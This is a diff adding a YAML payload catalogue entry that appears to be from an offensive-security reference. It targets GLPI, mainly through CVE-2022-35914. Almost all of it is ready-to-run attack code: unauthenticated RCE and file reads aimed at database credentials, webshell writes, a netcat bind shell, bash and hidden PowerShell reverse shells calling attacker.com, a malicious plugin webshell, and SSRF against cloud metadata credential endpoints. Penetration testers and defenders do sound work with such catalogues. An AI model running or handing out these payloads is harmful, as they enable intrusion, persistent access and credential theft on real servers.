@@ -1,0 +1,253 @@
+---
+comment: |
+  GLPI is a PHP-based open-source IT asset management and service desk platform.
+
+  CVE-2022-35914 (CVSS 9.8): Unauthenticated RCE via PHP code injection in the htmlLawed
+  library bundled with GLPI. The file `/vendor/htmlawed/htmlawed/htmLawedTest.php` is a
+  test script that should not be present in production. Its `hhook` parameter is passed
+  directly to `call_user_func()`, allowing any PHP callable (system, passthru, exec,
+  file_get_contents, file_put_contents) to be invoked with arbitrary arguments supplied
+  via the `text` parameter. No authentication required. Affects GLPI 10.0.0 through 10.0.2.
+  Fixed in GLPI 10.0.3 by removing the test file from the distribution.
+  nuclei: CVE-2022-35914
+  ExploitDB: 51102
+
+  Admin plugin upload: GLPI administrators can install PHP plugins via
+  Setup > Plugins. A minimal plugin (setup.php + arbitrary PHP files) is deployed to
+  /plugins/ and served directly by the web server.
+functions:
+  bind-shell:
+  - code: |
+      # CVE-2022-35914: bind shell via proc_open callable (Linux)
+      # The hhook parameter selects the PHP callable; text provides the argument.
+      # proc_open is called with a crafted descriptor array for a bind shell.
+      # Use the webshell entry to write a bind-shell PHP file instead for reliability.
+      curl -s -X POST "http://victim.com/vendor/htmlawed/htmlawed/htmLawedTest.php" \
+        --data-urlencode 'hhook=system' \
+        --data-urlencode 'text=nc -lvp 12345 -e /bin/sh &' \
+        --data-urlencode 'sid=1'
+    comment: |
+      CVE-2022-35914: invokes system() via call_user_func() to start netcat in listen
+      mode as a background process. Requires nc with -e support on the target.
+      Connect from the attacker with: nc victim.com 12345
+      The sid parameter must be non-empty to pass htmLawedTest.php's input validation.
+    connector: tcp-client
+    contexts:
+      unauthenticated:
+    platform: linux
+    tty: false
+    version: |
+      10.0.0 - 10.0.2 (before 10.0.3)
+  file-read:
+  - code: |
+      # CVE-2022-35914: read an arbitrary file via file_get_contents callable
+      curl -s -X POST "http://victim.com/vendor/htmlawed/htmlawed/htmLawedTest.php" \
+        --data-urlencode 'hhook=file_get_contents' \
+        --data-urlencode 'text=/etc/passwd' \
+        --data-urlencode 'sid=1'
+
+      # Useful target files:
+      # /var/www/html/glpi/config/config_db.php  (database credentials)
+      # /etc/glpi/config_db.php                  (alternate config location)
+      # /etc/passwd
+    comment: |
+      CVE-2022-35914: file_get_contents() is passed directly to call_user_func() with
+      the text parameter as its argument. The file contents appear in the HTML response
+      body (search for the value between the textarea tags in the response).
+      config_db.php contains the database hostname, name, username, and password.
+    contexts:
+      unauthenticated:
+    version: |
+      10.0.0 - 10.0.2 (before 10.0.3)
+  file-write:
+  - code: |
+      # CVE-2022-35914: write arbitrary content via file_put_contents callable
+      # file_put_contents(filename, data) - supply as JSON array in text parameter
+      # call_user_func('file_put_contents', $text) won't accept two args directly;
+      # use system() to invoke a shell command that writes the file instead:
+      curl -s -X POST "http://victim.com/vendor/htmlawed/htmlawed/htmLawedTest.php" \
+        --data-urlencode 'hhook=system' \
+        --data-urlencode 'text=echo "<?php system(\$_GET[c]); ?>" > /var/www/html/glpi/shell.php' \
+        --data-urlencode 'sid=1'
+
+      # Verify the file was written:
+      curl -s "http://victim.com/shell.php?c=id"
+    comment: |
+      CVE-2022-35914: uses system() to execute a shell command that writes a file.
+      The echo payload writes a PHP webshell to the GLPI web root.
+      The exact web root path depends on the installation; common locations:
+        /var/www/html/glpi/
+        /var/www/glpi/
+        /usr/share/glpi/
+      Use the file-read entry to read /etc/apache2/sites-enabled/ or /proc/1/cmdline
+      to confirm the document root.
+    contexts:
+      unauthenticated:
+    version: |
+      10.0.0 - 10.0.2 (before 10.0.3)
+  rce:
+  - code: |
+      # CVE-2022-35914: unauthenticated RCE via htmLawedTest.php callable injection
+      curl -s -X POST "http://victim.com/vendor/htmlawed/htmlawed/htmLawedTest.php" \
+        --data-urlencode 'hhook=passthru' \
+        --data-urlencode 'text=id' \
+        --data-urlencode 'sid=1'
+    comment: |
+      CVE-2022-35914: htmLawedTest.php passes the hhook parameter directly to
+      call_user_func() and the text parameter as its argument. Using passthru() returns
+      full command output inline in the HTML response body.
+      The sid parameter must be present and non-empty to pass the script's validation.
+      nuclei: CVE-2022-35914
+      ExploitDB: 51102
+    contexts:
+      unauthenticated:
+    version: |
+      10.0.0 - 10.0.2 (before 10.0.3)
+  - code: |
+      # Admin plugin upload: deploy a PHP webshell as a GLPI plugin
+      # 1. Create the plugin directory structure:
+      mkdir -p /tmp/glpishell/glpishell
+      cat > /tmp/glpishell/glpishell/setup.php <<'PHPEOF'
+      <?php
+      function plugin_version_glpishell() {
+          return ['name' => 'Shell', 'version' => '1.0', 'author' => 'a',
+                  'license' => 'MIT', 'homepage' => '', 'minGlpiVersion' => '10.0'];
+      }
+      function plugin_glpishell_check_prerequisites() { return true; }
+      function plugin_glpishell_check_config() { return true; }
+      PHPEOF
+      cat > /tmp/glpishell/glpishell/shell.php <<'PHPEOF'
+      <?php if(isset($_REQUEST['c'])){echo shell_exec($_REQUEST['c']);} ?>
+      PHPEOF
+
+      # 2. Create the plugin ZIP:
+      cd /tmp/glpishell && zip -r glpishell.zip glpishell/
+
+      # 3. Upload and install via Setup > Plugins > Upload plugin (admin session required):
+      # Use the web UI or the API to upload glpishell.zip, then click Install + Enable.
+      # 4. Access the webshell:
+      curl "http://victim.com/plugins/glpishell/shell.php?c=id"
+    comment: |
+      GLPI administrators can install plugins as ZIP archives. The plugin is extracted
+      to /plugins/ and PHP files are executed directly by the web server.
+      No server restart is required - the plugin activates immediately after enabling.
+      The setup.php file satisfies GLPI's plugin API requirements.
+      Access at: http://victim.com/plugins/glpishell/shell.php?c=id
+    contexts:
+      admin:
+      plugin:
+  reverse-shell:
+  - blind: true
+    code: |
+      # CVE-2022-35914: reverse bash shell (Linux)
+      curl -s -X POST "http://victim.com/vendor/htmlawed/htmlawed/htmLawedTest.php" \
+        --data-urlencode 'hhook=system' \
+        --data-urlencode 'text=bash -c "bash -i >& /dev/tcp/attacker.com/12345 0>&1" &' \
+        --data-urlencode 'sid=1'
+    comment: |
+      CVE-2022-35914: executes a bash reverse shell via system(). The trailing & runs
+      it in the background so the HTTP response returns immediately.
+      Check the listener for the incoming connection.
+    contexts:
+      unauthenticated:
+    listener: tcp-server
+    platform: linux
+    tty: false
+    version: |
+      10.0.0 - 10.0.2 (before 10.0.3)
+  - blind: true
+    code: |
+      # CVE-2022-35914: PowerShell reverse shell (Windows)
+      python3 - <<'EOF'
+      import urllib.parse, requests
+
+      TARGET = "http://victim.com/vendor/htmlawed/htmlawed/htmLawedTest.php"
+      LHOST  = "attacker.com"
+      LPORT  = "12345"
+
+      ps = (
+          f'$c=New-Object Net.Sockets.TCPClient("{LHOST}",{LPORT});'
+          '$s=$c.GetStream();[byte[]]$b=0..65535|%{0};'
+          'while(($i=$s.Read($b,0,$b.Length)) -ne 0){'
+          '$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);'
+          '$r=(iex $d 2>&1|Out-String);'
+          '$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}'
+      )
+      cmd = f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "{ps}"'
+      requests.post(TARGET, data={
+          'hhook': 'system',
+          'text': cmd,
+          'sid': '1',
+      })
+      print(f"[*] Payload sent - check listener on {LHOST}:{LPORT}")
+      EOF
+    comment: |
+      CVE-2022-35914 Windows variant: invokes system() to launch a hidden PowerShell
+      reverse shell. The HTTP response returns immediately; check the listener.
+    contexts:
+      unauthenticated:
+    listener: tcp-server
+    platform: windows
+    tty: false
+    version: |
+      10.0.0 - 10.0.2 (before 10.0.3)
+  ssrf:
+  - code: |
+      # GLPI RSS feed feature: server-side URL fetch (admin)
+      # GLPI's RSS feed widget fetches remote URLs server-side via SimplePie.
+      # Navigate to: Central > Add a RSS feed widget
+      # Set the URL to an internal resource or cloud metadata endpoint.
+      # Alternatively, use the feed URL directly via the API:
+      curl -s -b "$(python3 -c "
+      import requests
+      s=requests.Session()
+      r=s.post('http://victim.com/front/login.php', data={
+          'login':'glpi','password':'glpi','auth':'local'})
+      print('; '.join(f'{c.name}={c.value}' for c in s.cookies))
+      ")" \
+        "http://victim.com/ajax/getRssList.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+
+      # Cloud metadata targets:
+      # AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+      # GCP:        http://metadata.google.internal/computeMetadata/v1/
+      # Azure:      http://169.254.169.254/metadata/instance?api-version=2021-02-01
+    comment: |
+      GLPI's RSS feed functionality fetches external URLs server-side, enabling SSRF
+      to reach internal services and cloud metadata endpoints. Requires authenticated
+      access. The response content is returned in the AJAX response body.
+      If SimplePie parsing fails, the raw HTTP response body may still be reflected
+      in error output depending on the GLPI version and configuration.
+    contexts:
+      admin:
+      authenticated:
+  webshell:
+  - code: |
+      # CVE-2022-35914: write a webshell via system() echo (no file_put_contents needed)
+      curl -s -X POST "http://victim.com/vendor/htmlawed/htmlawed/htmLawedTest.php" \
+        --data-urlencode 'hhook=system' \
+        --data-urlencode 'text=echo "<?php if(isset(\$_REQUEST['"'"'c'"'"'])){echo shell_exec(\$_REQUEST['"'"'c'"'"']);}?>" > /var/www/html/glpi/shell.php' \
+        --data-urlencode 'sid=1'
+
+      # Verify:
+      curl -s "http://victim.com/shell.php?c=id"
+    comment: |
+      CVE-2022-35914: writes a persistent PHP webshell to the GLPI web root using
+      system() to invoke an echo shell command. Adjust the path to the actual document
+      root of the target installation. The shell is accessible via direct HTTP request.
+      Access at: http://victim.com/shell.php?c=id
+    contexts:
+      unauthenticated:
+    version: |
+      10.0.0 - 10.0.2 (before 10.0.3)
+  - code: |
+      # Admin plugin upload webshell (see rce entry for full packaging instructions)
+      # Once the glpishell plugin is installed and enabled:
+      curl "http://victim.com/plugins/glpishell/shell.php?c=id"
+    comment: |
+      Persistent PHP webshell deployed as a GLPI plugin. The plugin survives GLPI
+      updates and remains active until explicitly uninstalled.
+      See the rce (admin) entry for the full packaging and installation procedure.
+    contexts:
+      admin:
+      plugin:
+...
